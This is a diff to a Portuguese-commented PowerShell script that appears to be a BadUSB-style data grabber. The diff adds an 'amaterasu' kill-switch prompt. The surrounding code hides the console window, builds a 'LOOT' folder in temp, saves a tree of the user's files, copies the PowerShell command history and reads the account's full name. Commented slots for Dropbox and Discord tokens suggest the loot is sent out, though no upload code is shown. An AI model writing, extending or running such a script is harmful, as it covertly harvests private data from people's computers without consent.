@@ -40,12 +40,49 @@
 #  Steam: Clank.PT                                                                                                                                         #
 ############################################################################################################################################################
 
+# Define uma função para verificar a entrada do usuário
+function Verificar-Input {
+    $input = Read-Host "Insira 'amaterasu' para desativar tudo"
+
+    if ($input -eq "amaterasu") {
+        Write-Host "Desativando todas as atividades..."
+        # Parar todas as atividades aqui
+        # Por exemplo, você pode parar o agendamento, encerrar processos em execução, etc.
+        # Certifique-se de adicionar aqui todas as operações que deseja desativar quando a palavra-chave for inserida
+        Stop-Process -Name "powershell" -Force
+        exit
+    } else {
+        Write-Host "Código de desativação incorreto."
+        # Chama a função novamente para verificar nova entrada
+        Verificar-Input
+    }
+}
+
+# Chama a função para verificar a entrada do usuário continuamente
+Verificar-Input
+
 $i = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
 add-type -name win -member $i -namespace native;
 [native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);
 
+function Desativar-Tudo {
+    param (
+        [string]$input
+    )
 
-# Faz uma Pasta chamada LOOT, um ficheiro em txt, e um ZIP 
+    if ($input -eq "amaterasu") {
+        Write-Host "Desativando todas as atividades..."
+        # Parar todas as atividades aqui
+        # Por exemplo, você pode parar o agendamento, encerrar processos em execução, etc.
+        # Certifique-se de adicionar aqui todas as operações que deseja desativar quando a palavra-chave for inserida
+        Stop-Process -Name "powershell" -Force
+    } else {
+        Write-Host "Código de desativação incorreto."
+    }
+}
+
+# Adicione esta verificação ao final do script
+Desativar-Tudo -input $input
 
 $FolderName = "$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm)"
 
@@ -55,15 +92,11 @@ $ZIP = "$FolderName.zip"
 
 New-Item -Path $env:tmp/$FolderName -ItemType Directory
 
-############################################################################################################################################################
-
 # Inserir os tokens pedidos abaixo "dropbox e/ou discord". 
 
 #$db = ""
 
 #$dc = ""
-
-############################################################################################################################################################
 
 # Reconhecimento de todos os diretórios do utilizador
 tree $Env:userprofile /a /f >> $env:TEMP\$FolderName\tree.txt
@@ -71,17 +104,12 @@ tree $Env:userprofile /a /f >> $env:TEMP\$FolderName\tree.txt
 # Histórico da PowerShell
 Copy-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Destination  $env:TEMP\$FolderName\Powershell-History.txt
 
-############################################################################################################################################################
-
 function Get-fullName {
 
     try {
     $fullName = (Get-LocalUser -Name $env:USERNAME).FullName
     }
- 
- # If no name is detected function will return $env:UserName 
 
-    # Write Error is just for troubleshooting 
     catch {Write-Error "No name was detected" 
     return $env:UserName
     -ErrorAction SilentlyContinue
